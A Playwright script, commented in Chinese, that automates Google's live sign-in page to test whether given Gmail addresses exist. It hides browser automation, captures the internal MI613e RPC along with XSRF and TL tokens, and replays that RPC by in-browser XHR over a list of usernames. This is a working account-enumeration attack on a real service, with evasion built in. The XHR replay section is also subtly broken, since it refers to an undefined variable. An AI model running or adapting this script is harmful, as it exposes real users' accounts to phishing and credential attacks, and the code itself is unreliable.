// 深入测试登录页 MI613e RPC - 提取完整请求/响应格式
const { chromium } = require('playwright');

async function main() {
  const browser = await chromium.launch({
    headless: false,
    args: ['--disable-blink-features=AutomationControlled']
  });
  const ctx = await browser.newContext({
    userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
  });
  const page = await ctx.newPage();
  page.setDefaultTimeout(15000);

  const captures = [];
  page.on('request', req => {
    if (req.method() === 'POST' && req.url().includes('batchexecute')) {
      captures.push({
        url: req.url(),
        postData: req.postData(),
        headers: req.headers(),
        ts: Date.now()
      });
    }
  });
  page.on('response', async res => {
    if (res.request().method() === 'POST' && res.url().includes('batchexecute')) {
      const entry = captures.find(e => e.url === res.url() && !e.responseBody);
      if (entry) {
        entry.responseBody = await res.text().catch(() => '');
        entry.status = res.status();
      }
    }
  });

  const testEmails = [
    { email: 'dhjfkjshfk234hjkdhkh@gmail.com', expect: 'not-exist' },
    { email: 'test@gmail.com', expect: 'exist' },
    { email: '000001@gmail.com', expect: 'exist' },
    { email: '999999@gmail.com', expect: 'unknown' },
    { email: 'xyzrandom99887766abc@gmail.com', expect: 'not-exist' },
  ];

  for (const tc of testEmails) {
    console.log(`\n${'='.repeat(50)}`);
    console.log(`测试: ${tc.email} (预期: ${tc.expect})`);
    console.log('='.repeat(50));

    captures.length = 0;

    await page.goto('https://accounts.google.com/signin', { waitUntil: 'domcontentloaded', timeout: 20000 });
    await page.waitForTimeout(2000);

    const emailInput = page.locator('input[type="email"]');
    if (await emailInput.count() === 0) {
      console.log('  ❌ 找不到 email 输入框');
      continue;
    }

    await emailInput.fill(tc.email);
    await page.waitForTimeout(300);
    await page.locator('button:has-text("下一步"), button:has-text("Next")').click();
    await page.waitForTimeout(5000);

    const finalUrl = page.url();
    const bodyText = await page.locator('body').innerText().catch(() => '');

    console.log(`  URL: ${finalUrl.substring(0, 100)}`);
    console.log(`  页面文本: ${bodyText.substring(0, 150)}`);

    // 分析 RPC 响应
    const mi613eCaptures = captures.filter(c => c.url.includes('MI613e'));
    console.log(`  MI613e 请求数: ${mi613eCaptures.length}`);

    for (const cap of mi613eCaptures) {
      console.log(`\n  --- RPC 请求 ---`);
      console.log(`  URL: ${cap.url.substring(0, 120)}`);
      console.log(`  PostData: ${(cap.postData || '').substring(0, 300)}`);
      console.log(`  Status: ${cap.status}`);
      console.log(`  Response (full): ${(cap.responseBody || '').substring(0, 500)}`);

      // 提取 URL 参数
      try {
        const u = new URL(cap.url);
        console.log(`  TL: ${u.searchParams.get('TL') || 'none'}`);
        console.log(`  source-path: ${u.searchParams.get('source-path') || 'none'}`);
      } catch {}

      // 提取 XSRF token
      const atMatch = (cap.postData || '').match(/at=([^&]+)/);
      if (atMatch) console.log(`  XSRF: ${decodeURIComponent(atMatch[1]).substring(0, 40)}...`);
    }

    // 判断结果
    const notFound = bodyText.includes('找不到') || bodyText.includes("Couldn't find");
    const hasPassword = finalUrl.includes('challenge') || finalUrl.includes('password');
    console.log(`\n  结果: notFound=${notFound} | hasPassword=${hasPassword}`);
  }

  // 提取 WIZ_global_data tokens
  console.log('\n\n=== WIZ_global_data tokens ===');
  try {
    const wizData = await page.evaluate(() => {
      const wiz = window.WIZ_global_data || {};
      return {
        xsrf: wiz['SNlM0e'] || '',
        fSid: wiz['FdrFJe'] || '',
        dsh: wiz['Qzxixc'] || '',
      };
    });
    console.log(`  XSRF: ${wizData.xsrf.substring(0, 40)}...`);
    console.log(`  f.sid: ${wizData.fSid}`);
    console.log(`  dsh: ${wizData.dsh}`);
  } catch (e) {
    console.log(`  Error: ${e.message}`);
  }

  // 尝试在浏览器内直接用 XHR 调用 MI613e
  console.log('\n\n=== 浏览器内 XHR 测试 MI613e ===');
  if (captures.length > 0) {
    const lastCap = captures[captures.length - 1];
    const tlMatch = lastCap.url.match(/TL=([^&]+)/);
    const atMatch = (lastCap.postData || '').match(/at=([^&]+)/);
    const tlToken = tlMatch ? decodeURIComponent(tlMatch[1]) : '';
    const xsrfToken = atMatch ? decodeURIComponent(atMatch[1]) : '';

    console.log(`  TL: ${tlToken.substring(0, 40)}...`);
    console.log(`  XSRF: ${xsrfToken.substring(0, 40)}...`);

    if (tlToken && xsrfToken) {
      // 用 XHR 直接调用
      const xhrTests = ['dhjfkjshfk234hjkdhkh', 'test', '000001', '999999'];
      for (const username of xhrTests) {
        const result = await page.evaluate(async ({ username, xsrfToken, tlToken }) => {
          const email = username + '@gmail.com';
          // MI613e 的请求格式需要从抓包中分析
          const innerData = `["${email}","AE0e",null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,[],null,null,null,null,null,null,[null,null,null,null,"${email}"]]`;
          const reqData = `[["MI613e",${JSON.stringify(innerData)},null,"generic"]]`;
          const body = `f.req=${encodeURIComponent(`[${reqData}]`)}&at=${encodeURIComponent(xsrfToken)}&`;
          const url = `/v3/signin/_/AccountsSignInUi/data/batchexecute?rpcids=MI613e&TL=${encodeURIComponent(tlToken)}&_reqid=${Math.floor(Math.random() * 900000) + 100000}`;

          try {
            const r = await new Promise((resolve, reject) => {
              const xhr = new XMLHttpRequest();
              xhr.open('POST', url);
              xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded;charset=utf-8');
              xhr.onload = () => resolve({ status: xhr.status, text: xhr.responseText });
              xhr.onerror = () => reject(new Error('XHR error'));
              xhr.timeout = 10000;
              xhr.ontimeout = () => reject(new Error('timeout'));
              xhr.send(body);
            });
            return { status: result.status, body: result.text.substring(0, 400) };
          } catch (e) {
            return { error: e.message };
          }
        }, { username, xsrfToken, tlToken });

        console.log(`\n  [${username}@gmail.com] XHR 结果:`);
        if (result.error) {
          console.log(`    Error: ${result.error}`);
        } else {
          console.log(`    Status: ${result.status}`);
          console.log(`    Body: ${result.body}`);
        }
      }
    }
  }

  await browser.close();
  console.log('\n🏁 登录页深入测试完成');
}

main().catch(console.error);
